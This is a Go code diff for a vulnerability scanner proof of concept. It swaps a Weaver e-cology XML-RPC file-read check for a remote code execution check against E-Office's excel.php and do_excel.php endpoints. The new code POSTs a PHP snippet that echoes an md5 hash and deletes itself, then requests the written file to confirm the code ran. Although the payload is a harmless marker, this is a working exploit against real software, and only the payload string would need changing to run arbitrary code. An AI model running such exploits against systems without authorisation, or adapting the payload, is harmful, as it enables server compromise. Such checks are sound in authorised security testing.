@@ -8,14 +8,27 @@ import (
 
 func E_Office_do_excel_php_rce(u string) bool {
 	header := make(map[string]string)
-	header["Content-Type"] = "application/xml"
-	payload := "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall>\r\n<methodName>WorkflowService.getAttachment</methodName>\r\n<params><param><value><string>/test</string>\r\n</value></param></params></methodCall>"
-	url := u + "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet"
+	header["Content-Type"] = "application/x-www-form-urlencoded"
+	header["Accept-Encoding"] = "gzip, deflate"
+
+	payload := "html=<?php echo md5(233);unlink(__FILE__);?>"
+	url := u + "/general/charge/charge_list/excel.php"
+	url2 := u + "/general/charge/charge_list/do_excel.php"
+
 	if req, err := pkg.HttpRequset(url, "POST", payload, false, header); err == nil {
 		//pkg.GoPocLog(req.Body)
-		if req.StatusCode == 200 && strings.Contains(req.Body, "xml") && strings.Contains(req.Body, "methodResponse") && strings.Contains(req.Body, "name") && strings.Contains(req.Body, "value") {
-			pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_OA_XmlRpcServlet_file_read|%s\n", url))
-			return true
+		if req2, err := pkg.HttpRequset(url, "GET", "", false, header); err == nil {
+			if req.StatusCode == 200 && strings.Contains(req2.Body, "e165421110ba03099a1c0393373c5b43") {
+				pkg.GoPocLog(fmt.Sprintf("Found vuln E_Office_do_excel_php_rce|%s\n", url))
+				return true
+			}
+		}
+		if req3, err := pkg.HttpRequset(url2, "GET", "", false, header); err == nil {
+
+			if req.StatusCode == 200 && strings.Contains(req3.Body, "e165421110ba03099a1c0393373c5b43") {
+				pkg.GoPocLog(fmt.Sprintf("Found vuln E_Office_do_excel_php_rce|%s\n", url2))
+				return true
+			}
 		}
 	}
 
